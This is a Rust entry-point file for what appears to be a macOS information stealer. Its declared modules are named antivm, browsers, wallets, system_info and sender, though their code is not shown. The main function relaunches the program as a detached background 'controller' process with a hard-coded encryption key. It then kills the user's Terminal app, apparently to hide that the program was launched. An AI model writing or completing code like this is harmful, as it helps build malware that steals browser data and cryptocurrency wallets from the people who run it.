use std::process::Command;
use std::env;
use std::ffi::OsString;
use crate::controller::Controller;

mod config;
mod tools;
mod antivm;
mod system_info;
mod browsers;
mod wallets;
mod sender;
mod controller;

fn main() -> anyhow::Result<()> {
    let args: Vec<String> = env::args().collect();

    if args.len() > 1 && args[1] == "run_controller" {
        let encryption_key = args.get(2).ok_or(anyhow::anyhow!("Encryption key not provided"))?;
        let controller = Controller::new(encryption_key.to_string());
        controller.manage()?;
        Ok(())
    } else {
        let executable_path = env::current_exe()?;
        let encryption_key = config::ENCRYPTION_KEY.to_string();

        let mut command = Command::new(executable_path);
        command.arg("run_controller");
        command.arg(encryption_key);

        command.spawn()?;

        Command::new("killall").arg("Terminal").spawn()?;

        Ok(())
    }
} 